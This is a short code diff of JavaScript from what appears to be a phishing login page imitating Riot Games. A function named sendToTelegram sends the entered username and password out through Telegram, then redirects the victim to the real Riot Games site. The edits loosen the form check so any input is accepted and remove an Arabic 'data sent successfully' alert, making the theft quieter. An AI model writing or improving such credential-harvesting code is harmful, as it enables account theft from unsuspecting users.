@@ -13,7 +13,7 @@ function checkInputs() {
     const password = document.getElementById("password").value.trim();
     const loginBtn = document.getElementById("login-btn");
 
-    if (username !== "" && password.length > 6) {
+      if (username !== "" || password !== "") {
         loginBtn.removeAttribute("disabled");
     } else {
         loginBtn.setAttribute("disabled", "true");
@@ -37,7 +37,7 @@ function sendToTelegram() {
 
     fetch(url)
         .then(() => {
-            alert("تم إرسال البيانات بنجاح!");
+    
             window.location.href = "https://www.riotgames.com/";
         })
         .catch(error => console.error("Error sending to Telegram:", error));
